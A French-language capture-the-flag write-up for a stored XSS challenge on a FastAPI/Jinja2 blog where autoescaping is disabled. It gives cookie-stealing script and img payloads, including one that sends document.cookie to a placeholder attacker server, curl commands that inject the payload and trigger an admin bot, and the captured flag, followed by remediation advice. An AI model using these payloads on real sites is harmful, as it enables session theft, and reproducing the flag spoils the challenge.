# Write-Up - TimeTraveler's Blog (XSS)

## Reconnaissance

En visitant le blog, on observe :
1. Un blog avec des articles et un système de commentaires
2. Le post "WARNING: Temporal Anomaly Detected" mentionne qu'un **admin bot vérifie régulièrement les commentaires**
3. Les commentaires sont affichés sans aucune transformation visible

On teste si le champ commentaire est vulnérable au XSS en postant un commentaire simple :

```
Callsign: test
Message: <b>bold test</b>
```

Le texte s'affiche en gras → le HTML est interprété → **XSS possible**.

---

## Identification de la vulnérabilité

L'application utilise FastAPI avec Jinja2. En temps normal, Jinja2 échappe automatiquement le HTML. Ici, l'autoescaping a été **désactivé volontairement** :

```python
templates.env.autoescape = False
```

Et le template affiche le contenu brut :

```html
{{ comment.content }}
```

C'est une **Stored XSS** (CWE-79) : le payload est stocké en base de données et exécuté à chaque visite de la page.

---

## Exploitation

### Étape 1 : Préparer un récepteur de cookies

On peut utiliser :
- Un serveur perso (`python3 -m http.server`)
- Un service comme [RequestBin](https://requestbin.com) ou [Webhook.site](https://webhook.site)
- L'endpoint `/webhook` inclus dans le challenge (pour le test local)

### Étape 2 : Injecter le payload XSS

Aller sur un post (par exemple `/post/3`) et poster un commentaire :

**Callsign:** `hacker`

**Message (payload):**
```html
<script>
fetch('https://VOTRE_SERVEUR/?c=' + document.cookie);
</script>
```

Ou en utilisant le webhook intégré (en local) :
```html
<script>
fetch('/webhook?data=' + encodeURIComponent(document.cookie));
</script>
```

Ou avec une balise `<img>` pour bypass certains filtres (ici pas nécessaire) :
```html
<img src=x onerror="fetch('/webhook?data='+document.cookie)">
```

### Étape 3 : Déclencher la visite du bot admin

Le bot visite automatiquement la page quand un commentaire est posté. On peut aussi le déclencher manuellement via l'API :

```bash
curl -X POST http://localhost:3000/visit \
  -d "url=http://web:8000/post/3"
```

### Étape 4 : Récupérer le flag

Dans les logs du serveur ou dans le webhook, on voit :

```
[WEBHOOK] Received exfiltrated data:
  session=s3cr3t_4dm1n_t0k3n_d0_n0t_l34k; flag=HIT{x55_t1m3_tr4v3l_1s_d4ng3r0us}
```

---

## Flag

```
HIT{x55_t1m3_tr4v3l_1s_d4ng3r0us}
```

---

## Solution one-liner

```bash
# 1. Post XSS payload
curl -X POST http://localhost:8000/post/3/comment \
  -d "username=pwned" \
  -d 'content=<script>fetch("/webhook?data="+document.cookie)</script>'

# 2. Trigger bot visit
curl -X POST http://localhost:3000/visit \
  -d "url=http://localhost:8000/post/3"

# 3. Check logs
docker logs hackintime-timetravelers-blog 2>&1 | grep WEBHOOK
```

---

## Remédiation

Pour corriger cette vulnérabilité :

1. **Ne jamais désactiver l'autoescaping Jinja2** :
   ```python
   # Supprimer cette ligne :
   templates.env.autoescape = False
   ```

2. **Utiliser le filtre `|e` explicitement** si autoescaping est désactivé pour une raison :
   ```html
   {{ comment.content | e }}
   ```

3. **Implémenter une Content Security Policy (CSP)** :
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Sanitiser les entrées côté serveur** avec une lib comme `bleach` :
   ```python
   import bleach
   clean_content = bleach.clean(content)
   ```

---

## Références

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
